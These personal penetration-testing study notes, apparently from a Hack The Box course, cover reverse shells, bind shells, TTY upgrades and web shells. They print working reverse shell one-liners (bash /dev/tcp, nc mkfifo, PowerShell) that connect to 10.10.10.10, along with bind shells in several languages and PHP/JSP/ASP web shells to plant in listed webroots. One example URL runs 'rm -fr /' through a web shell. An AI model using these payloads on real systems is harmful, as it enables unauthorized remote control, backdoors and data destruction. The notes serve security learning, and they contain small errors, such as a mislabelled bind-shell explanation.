Shells are really important, as this is how you actually connect to a computer to execute a series of commands. 

Shells are needed when a constant and reliable connection is necessary to dig deeper into a host or network. The benefit of shells- you don't always need login credentials to access them and create sessions. 

### Types of shells

#### Reverse shell

- most common type of shell, easiest to deploy
- If an RCE is discovered on a target, we can start a netcat listener on any port locally. Then, a simple reverse shell command can be launched through the RCE targeting our local port, and then a reverse shell connection is established. 

##### netcat listener
really simple:
```bash
nv -nvlp <1234>
```


where:
-l listen mode, waiting for the connection
-v verbose, know when a connection is received
-n disables DNS resolution and only connect from/to IP addresses to speed up the connection
-p specifies the port number

##### reverse shell command
see Payload All The Things for a list of reverse shell commands in various langs:
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

certain reverse shell commands are simple, and more reliable. 
Bash:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

powershell script is really long:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Reverse shells are really handy and quick, but they arent as stable. its much easier for a command to get dropped and lose connection. If its lost, the original attach chain has to be redone to set up the shell again, which is tedious and unreliable if discovered.

#### Bind Shell
Unlike the reverse shell, this is where we connect to the target's listening port. When a bind shell command is executed, it opens up a listening port on the target's computer. From there, we connect to it from our local shell onto that port. 

Once again, Payload All The Things is a great resource.
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/


Basically, this is making the target initiate a reverse shell, which makes it slightly more reliable. These commands are executed FROM THE TARGET HOST

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Then, we can use netcat to connect to the target host. 

```bash
nc <0.0.0.0> <1234>
```

This is only a little bit more reliable, because if the connection gets dropped than its easy to just reconnect to it by connecting to the target port. However, if we are discovered and the ports are closed, than the exploit chain has to be rerun to rebuild the reverse shell. 


### upgrading to TTY
Once a shell is established, it is a completely rudamentary shell. it will only have typing command and backspace, no capabilities of scrolling, moving cursor, etc. So, we can upgrade to TTY in order to improve our shell funtionality.

There are multiple ways to do this, one is the python/stty method.

in netcat, execute the following:
```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
```

After that command is run, hit ctrl+z to put the shell into background and get onto our local terminal. Then execute the following stty command:

```shell-session
www-data@remotehost$ ^Z

Winn13@htb[/htb]$ stty raw -echo
Winn13@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

when fg is entered, it will bring back the netcat shell. Either, you can hit Enter in the shell, or input 'reset' and hit ehter to bring it back. 

There may be visual bugs affecting the terminal dimensions and its text size, as the remote machine does not know our local display dimensions. you can run these to see the LOCAL dimensions:

```shell
echo $TERM
```

```shell
stty size
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```


### Web Shells

web shells are different than standard shells. Its almost like using an API as a shell. Web shells use web scripts, like php, aspx, or javascript to send commands through request parameters like GET or POST 


#### writing a web shell
Web shell commands are different depending on what service is being hosted by the target. We need to write our web shell that would take our command through a GET request, execute it, and print its output back. Web shells are typically really short and can be memorized easily. 

Basically, these are really simple commands that show we can use the web scripting language to place and run a command. 

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

This is what a web shell is. The ability to execute commands through a web service. 

Now that we have found a web shell, we can place a **web shell script**
The web shell script must be placed in the hosts' webroot to execute the script through the browser

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\|   |
| `XAMPP`    | C:\xampp\htdocs\|      |

After we determine where the webroot is, we can then use the web shell to place our web shell script i.e. shell.php. This is basically a back door. Once an arbitrary file is uploaded onto a webserver, it can be accessed and run from any endpoint. For instance, here is a simple attack chain:

A misconfiguration is found that allows us to upload files on an apache server with php.

we upload this php script to /var/www/html/shell.php
```php
<?php system($_REQUEST["cmd"]); ?>
```

Now, the command is accessible from anywhere, as long as you know the shell script exists on the remote host.

To execute commands through the shell, all you have to do is visit (or even better use cURL):
https://targethost.com/uploadsOrWhatever/shell.php?cmd=whoami
or, other commands like
https://targethost.com/uploadsOrWhatever/shell.php?cmd=rm%20-fr%20/ because %20 is the url-encoded version of space.



Overall, websell scripts aren't as convenient as reverse shell or bind shells. However, if you have code execution on a remote host and can escalate to user or admin priv, you can just set up a bind shell from there. Alternatively,you can use python scripts to automate the process and give semi interactive scripts like the web shell is an API.